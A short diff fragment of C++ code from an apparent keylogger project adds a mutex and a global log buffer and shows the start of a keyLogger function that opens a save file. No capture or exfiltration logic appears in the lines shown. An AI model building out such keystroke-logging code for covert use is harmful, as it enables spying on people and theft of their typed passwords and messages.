@@ -1,5 +1,8 @@
 #include "KeyLogger.h"
 
+std::mutex logMutex;
+std::string logData;
+
 bool Services::keyLogger(const std::string &saveFile) {  
     std::ofstream fout(saveFile.c_str());  
     if (!fout.is_open()) {  
